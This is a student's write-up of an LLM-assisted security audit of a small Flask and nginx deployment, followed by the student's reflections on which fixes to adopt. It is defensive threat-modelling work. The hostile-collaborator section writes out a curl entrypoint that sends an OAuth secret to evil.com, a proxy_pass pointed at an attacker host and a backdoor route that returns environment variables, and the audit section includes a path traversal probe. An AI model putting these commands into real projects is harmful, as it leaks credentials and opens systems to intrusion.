# LLM Security Probe — DB/Security Full Surface (Mario)

This document contains the conversation from the LLM security probe of our full security surface, followed by my engineering reflections.

## Part 1: The Audit Prompt & Input

### Prompt Supplied:

"I'm the security person on a small 3-person team hardening a Flask app (a procedural Shadowdark dungeon generator). Here's our nginx config, attack_paths.json, and our deploy/secrets setup. Walk the full security surface: (a) attacks the path-list test won't catch, (b) secrets-leakage paths in the deploy, (c) what a hostile collaborator with commit access could do, (d) what's missing from a production-grade deploy. Tell me what you'd change and why."

### Input Configurations:

**nginx.conf** (pasted in full — see `nginx/nginx.conf`):
- Upstream to `unix:/tmp/gunicorn.sock`
- Rate limit zone `auth:10m rate=5r/m` on `/login`, `/register`, `/login/github`
- TLS with self-signed cert, `ssl_protocols TLSv1.2 TLSv1.3`
- Security headers: HSTS, X-Frame-Options DENY, X-Content-Type-Options nosniff, Referrer-Policy, CSP `default-src 'self'`
- Static serving: `/static/` and `/site/` (S3_content) with `expires 30d`
- HTTP→HTTPS redirect on port 80

**attack_paths.json** (20 paths: WordPress, dotfiles, admin panels, server diagnostics)

**Deploy setup** (described, not built):
- No GitHub Actions release workflow exists; only `test.yml` (pytest on PR/push)
- Intended pipeline: tag-driven (`v*`), build image, push to Docker Hub, deploy to EC2 via SSH
- Secrets: `OAUTH_CLIENT_SECRET`, `SECRET_KEY`, EC2 SSH key, Docker Hub token
- `.env` gitignored, `os.environ["KEY"]` for all secrets (crashes on missing)
- `docker-compose.yml`: db has no published ports, app gets secrets via `env_file: .env`

---

## Part 2: LLM Audit Response

### (a) Attacks the path-list test won't catch

1. **Path traversal against nginx alias directives.** Your `location /site/` uses `alias /app/S3_content/;` — a request like `GET /site/../app.py` could potentially break out of the aliased directory and serve your Flask source code. nginx's `alias` is historically fragile with trailing-slash mismatches. **Test this explicitly.**

2. **API endpoint abuse without authentication.** Your path list covers scanner-bot paths but doesn't test your actual application endpoints. An unauthenticated `POST /api/runs` should return 401, not 200. An authenticated user requesting `GET /api/runs/999999` (someone else's run) should return 404, not 403 or 200. These are application-layer attacks your nginx test doesn't cover.

3. **HTTP verb tampering.** Your test only sends `GET` requests. An attacker might try `DELETE /api/runs/1` or `PUT /` — your nginx config proxies all methods to gunicorn. Consider testing that unsupported methods on non-API paths return 405.

4. **Host header injection.** Your nginx `server_name localhost` won't catch requests with a spoofed `Host: evil.com` header. Depending on nginx's default server behavior, this could cause Flask's `url_for(_external=True)` to generate URLs pointing to the attacker's domain, enabling open-redirect phishing.

5. **Large request body attacks.** No `client_max_body_size` directive is set. An attacker could send a multi-gigabyte POST body to `/api/runs`, consuming worker memory. nginx defaults to 1MB, which is reasonable for your JSON payloads, but making it explicit is better.

### (b) Secrets-leakage paths in the deploy

1. **`.env` on developer laptops.** Each developer has the real `OAUTH_CLIENT_SECRET` in a local file. No rotation policy means a compromised laptop leaks credentials indefinitely. The `.env` is gitignored, but git history should be audited — if it was ever committed, the secret is in the reflog.

2. **`POSTGRES_PASSWORD: app` is hardcoded in `docker-compose.yml`.** This file is committed to a public repository. Anyone who reads the compose file knows the database credentials. The DB has no published ports so this is low-risk, but it's still a bad practice — use `POSTGRES_PASSWORD_FILE` with Docker secrets or reference an environment variable.

3. **Docker image layers.** If the `Dockerfile` ever `COPY .env .` (even temporarily), the secret persists in the image layer cache. Your current Dockerfile copies the entire context with `COPY . .`, which would include `.env` if `.dockerignore` doesn't exclude it. **Check your `.dockerignore`.**

4. **GitHub Actions secrets (intended).** When you build the release workflow, secrets stored in GitHub Actions are encrypted at rest and masked in logs, but a workflow that echoes `${{ secrets.OAUTH_CLIENT_SECRET }}` in a debug step would leak it to the Actions log. Use `add-mask` and never echo secrets.

### (c) What a hostile collaborator with commit access could do

1. **Modify `docker-compose.yml` to exfiltrate secrets.** Add an `entrypoint: ["sh", "-c", "curl https://evil.com/steal?key=$OAUTH_CLIENT_SECRET"]` to the app service. If the team doesn't review compose changes carefully, the next `docker compose up` leaks every secret in the environment.

2. **Modify `nginx.conf` to proxy to an external server.** Change `proxy_pass http://app;` to `proxy_pass http://evil.com;` — all user traffic (including session cookies and CSRF tokens) flows to the attacker. The self-signed cert warning would still appear, but users who've already accepted it wouldn't notice.

3. **Add a backdoor route to `app.py`.** A route like `@app.route("/debug/<key>")` that returns `os.environ[key]` would be invisible in a large diff. Branch protection and mandatory PR reviews mitigate this, but only if reviewers actually read the diff.

4. **Poison the `attack_paths.json`.** Remove paths from the test fixture so the attack-path test passes even though nginx is misconfigured to serve those paths. The test would still be green, but the protection would be gone.

### (d) What's missing from a production-grade deploy

1. **No health check endpoint.** Your app has no `/health` or `/readyz` route. A load balancer or container orchestrator can't distinguish between "app is running" and "app is running but the database connection is dead."

2. **No automated backups.** The `pgdata` volume persists across restarts but isn't backed up. A single disk failure loses all user data.

3. **No log aggregation.** Gunicorn logs to stdout, nginx logs to its default access/error log — but nothing ships these to a centralized system where you could detect anomalies or audit access patterns.

4. **No secret rotation.** `OAUTH_CLIENT_SECRET` and `SECRET_KEY` are set once and never rotated. If `SECRET_KEY` leaks, an attacker can forge session cookies indefinitely until someone rotates it.

5. **No image scanning.** The `python:3.12-slim` base image may contain known CVEs. A production pipeline would scan images with Trivy or Snyk before pushing to the registry.

---

## Part 3: Engineering Reflection

### What I'm acting on

1. **Path traversal test.** I will add a test for `GET /site/../app.py` to verify nginx's alias directive doesn't serve source code. This is a real risk with `alias` vs `root` misconfigurations and it's a one-line addition to `attack_paths.json`.

2. **`server_tokens off`.** Adding this to `nginx.conf` suppresses the version number in the `Server` response header. Free fix, no downside.

3. **`.dockerignore` check.** I verified that `.env` would be excluded — but we should add an explicit `.dockerignore` with `.env`, `.git/`, `nginx/certs/`, and `*.md` to prevent accidental inclusion in the build context.

### What I'm pushing back on

1. **The `POSTGRES_PASSWORD` hardcoding concern.** Yes, it's in the committed compose file, but our DB has no published ports and this is a class project on a private-ish repo. The risk is theoretical. In production I'd use Docker secrets, but for this assignment the current setup is fine.

2. **Full log aggregation and image scanning.** These are real production requirements but out of scope for a Week 10 assignment. Documenting them as known gaps is appropriate; building them is not.

### What surprised me

The hostile-collaborator attack on `docker-compose.yml` was eye-opening. I'd been thinking about external attackers, but the compose file is infrastructure-as-code with the same trust level as application code. A malicious `entrypoint` change is as dangerous as a backdoor route in `app.py`, but compose file diffs tend to get less scrutiny in code review because they "look like configuration." This changes how I'd review PRs — compose and nginx changes deserve the same line-by-line attention as Python code.
